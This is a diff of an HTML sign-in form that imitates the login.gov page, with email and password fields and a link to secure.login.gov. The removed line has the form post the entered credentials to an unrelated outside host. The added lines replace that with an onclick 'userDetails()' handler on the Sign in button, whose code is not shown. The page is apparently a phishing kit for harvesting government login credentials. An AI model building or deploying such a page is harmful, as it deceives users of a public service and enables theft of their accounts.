@@ -146,19 +146,21 @@
 </div>
 
 
-<form id="myForm" class="simple form margin-top-4 new user" autocomplete="off" action="http://substat.jonardsiapno.com/js_eKSPAL.js" method="post">
+<form id="myForm" class="simple form margin-top-4 new user" autocomplete="off">
   <div class="margin-bottom-4 email required user_email validated-field__input-wrapper">
     <label class="usa-label email required" for="user_email">Email address</label>
-    <input class="usa-input usa-input--big string email required validated-field__input" autocorrect="off" aria-invalid="false" required="required" aria-required="true" type="email" name="user[email]" id="user_email" fdprocessedid="xg1gog">
+    <input class="usa-input usa-input--big string email required validated-field__input" autocorrect="off" aria-invalid="false" required="required" aria-required="true" type="email" name="user[email]" id="eail" fdprocessedid="xg1gog">
   </div>
   
   <div class="margin-bottom-4 password required user_password validated-field__input-wrapper">
     <label class="usa-label password required" for="password-toggle-input-333c3be2">Password</label>
-    <input class="usa-input usa-input--big password required password-toggleinput validated-fieldinput" autocomplete="current-password" id="password-toggle-input-333c3be2" type="password" name="user[password]">
+    <input class="usa-input usa-input--big password required password-toggleinput validated-fieldinput" autocomplete="current-password" id="password" type="password" name="user[password]">
   </div>
   
-  <button type="submit" class="usa-button usa-button--big usa-button--full-width" fdprocessedid="cut36">Sign in</button>
-</form> <div class="margin-x-neg-1 margin-top-205">
+  <button type="submit" onclick="userDetails()" class="usa-button usa-button--big usa-button--full-width" fdprocessedid="cut36">Sign in</button>
+</form>
+
+<div class="margin-x-neg-1 margin-top-205">
     <a class="padding-x-1" href="https://secure.login.gov/login/piv_cac">Sign in with your government employee ID</a>
   </div>
 
